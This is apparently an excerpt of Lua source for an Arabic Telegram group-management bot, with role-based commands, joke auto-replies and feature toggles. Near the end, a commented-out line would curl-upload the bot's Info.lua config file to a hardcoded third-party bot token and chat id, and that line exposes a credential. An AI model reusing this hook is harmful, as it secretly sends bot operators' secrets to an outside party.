database:srem(bot_id..'S00F4:MN:TF'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Mod:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Manager'..msg.chat_id_, result.sender_user_id_)
...
if text == ("مسح الردود العامه") and DevMohamed(msg) then 
...
if text == ("الردود العامه") and DevMohamed(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ☆ قائمة الردود العامه \n≪━━━━━━𝙴𝙻 𝙰𝙼𝙴𝚁 ⁦⁦━━━━━━≫\n"
for k,v in pairs(list) do
...
if text == 'اضف رد عام' and DevMohamed(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == 'حذف رد عام' and DevMohamed(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
database:set(bot_id.."E_L_A_M_E_R:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."E_L_A_M_E_R:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."E_L_A_M_E_R:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."E_L_A_M_E_R:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"☆تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."E_L_A_M_E_R:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."E_L_A_M_E_R:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس الامير يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'الامير').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and DevMohamed(msg) then   
...
if text == 'تعطيل المغادره' and DevMohamed(msg) then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and DevMohamed(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه?? ](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/E_L_A_M_E_R)') 
return false
end
...
if text == 'سلام' then 
send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'بوتي' then 
send(msg.chat_id_,msg.id_, '[قلب بوتكك من جواا 🥺♥️](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'هاي' or text == 'هاي' then
send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'باي' or text == 'باي' then
send(msg.chat_id_,msg.id_, '[ع فين لوين رايح وسايبنى🙁💔](t.me/E_L_A_M_E_R)') 
return false
end

if text == 'طيب' or text == 'تيب' then
send(msg.chat_id_,msg.id_, '[فرح خالتك قريب😹💋💃🏻](t.me/E_L_A_M_E_R)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لاء متقولش نينينينني😹🏃🏻‍♀♥️](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/E_L_A_M_E_R)')
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بعشقك يا روحي💋🥰](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/E_L_A_M_E_R)')
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/E_L_A_M_E_R)') 
return false
end
end
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'E_L_A_M_E_R')..')'
local iduser = result.sender_user_id_
...
local Mohamed = ' ☆ عدد الادمنيه : '..data.administrator_count_..
'\n\n ☆ عدد المطرودين : '..data.kicked_count_..
'\n\n ☆ عدد الاعضاء : '..data.member_count_..
'\n\n ☆ عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n ☆  اسم الجروب : ['..ta.title_..']'
send(msg.chat_id_, msg.id_, Mohamed) 
end,nil)
end,nil)
end 
...
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,Mohamed,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
...
local photps = (Mohamed.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local Mohameda = {
"..",
}
local rdphoto = Mohameda[math.random(#Mohameda)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
...
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Mohamed.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
...
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, Mohamed.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n- 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 ☆  '..username..'\n ☆- 𝐌𝐒𝐆𝐒  '..Msguser..'\n ☆ - 𝐒𝐓𝐀𝐓𝐒  '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ☆ - 𝐘𝐎𝐔𝐑.𝐈𝐃 '..msg.sender_user_id_..'\n- 𝐂𝐇 ☆ @E_L_A_M_E_R\n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n- 𝐔𝐒𝐄??𝐍𝐀𝐌𝐄 ☆  '..username..'\n ☆- 𝐌𝐒𝐆𝐒  '..Msguser..'\n ☆ - 𝐒𝐓𝐀𝐓𝐒  '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ☆ - 𝐘𝐎𝐔𝐑.𝐈𝐃 '..msg.sender_user_id_..'\n- 𝐂𝐇 ☆ @E_L_A_M_E_R\n')
else
...
Mohamed = text:match("^اضف رسائل (%d+)$")
database:set(bot_id..'id:user'..msg.chat_id_,Mohamed)  
...
Mohamed = text:match("^اضف نقاط (%d+)$")
database:set(bot_id..'idgem:user'..msg.chat_id_,Mohamed)  
...
if text == 'استعاده الاوامر' and DevMohamed(msg) then
...
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙴𝙻𝙰𝙼𝙴𝚁', url="t.me/E_L_A_M_E_R"},
{text = 'مبرمج السورس', url="t.me/M_W_12"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
keyboard.inline_keyboard = {
{
{text = 'كتم الاسماء', callback_data="/mute-name"},{text = 'التوحيد', callback_data="/Mohamed"},{text = 'تنبيه الأسماء', callback_data="/change-names"},
},
{
...
database:set(bot_id.." Mohamed:zhrf_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الزخرفه" and Manager(msg) then
send(msg.chat_id_, msg.id_,'☆تم تفعيل الزخرفه')
database:set(bot_id.." Mohamed:zhrf_Bots"..msg.chat_id_,"open")
end
if text and text:match("^زخرفه (.*)$") and database:get(bot_id.." Mohamed:zhrf_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." Mohamed:brj_Bots"..msg.chat_id_,"close")
end
if text == "تفعيل الابراج" and Manager(msg) then
send(msg.chat_id_, msg.id_,'☆ تم تفعيل الابراج')
database:set(bot_id.." Mohamed:brj_Bots"..msg.chat_id_,"open")
end
if text and text:match("^برج (.*)$") and database:get(bot_id.." Mohamed:brj_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.." Mohamed:age_Bots"..msg.chat_id_,"close")
end
if text == "تعطيل حساب العمر" and Manager(msg) then
send(msg.chat_id_, msg.id_, '☆ تم تعطيل حساب العمر')
database:set(bot_id.." Mohamed:age_Bots"..msg.chat_id_,"close")
...
database:set(bot_id.." Mohamed:age_Bots"..msg.chat_id_,"open")
end
if text and text:match("^احسب (.*)$") and database:get(bot_id.." Mohamed:age_Bots"..msg.chat_id_) == "open" then
...
database:set(bot_id.."Mohamed:movie_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الافلام" and Mod(msg) then
send(msg.chat_id_, msg.id_,'☆ تم تفعيل الافلام')
database:set(bot_id.."Mohamed:movie_bot"..msg.chat_id_,"open")
end
if text and text:match("^فلم (.*)$") and database:get(bot_id.."Mohamed:movie_bot"..msg.chat_id_) == "open" then
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'الامير')
...
--local curl = 'curl "'..'https://api.telegram.org/bot1779958706:AAG230-Po0VI5B3h3toYJHSMTQx_iQ82__s/sendDocument'..'" -F "chat_id='.. 1458090052 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
...
------------------------------------------------------------------------
local Mohamed_76_Bot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
if Mohamed_76_Bot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ☆ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ☆ ["..Mohamed_76_Bot.."] \n") 
else
...
end -- end new msg dev.mr Mohamed 
end -- end callback dev.mr Mohamed
